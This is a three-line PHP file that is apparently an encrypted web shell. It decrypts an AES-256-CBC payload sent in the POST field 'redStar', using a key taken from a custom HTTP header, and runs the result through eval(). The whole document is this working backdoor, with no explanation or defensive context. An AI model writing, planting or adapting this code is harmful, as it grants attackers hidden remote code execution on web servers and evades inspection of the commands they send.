<?php
$d = openssl_decrypt(substr(base64_decode($_POST['redStar']),16),"AES-256-CBC",$_SERVER['HTTP_REDSTAR'],OPENSSL_RAW_DATA,substr(base64_decode($_POST['redStar']),0,16));
eval("?>{$d}<?php"); #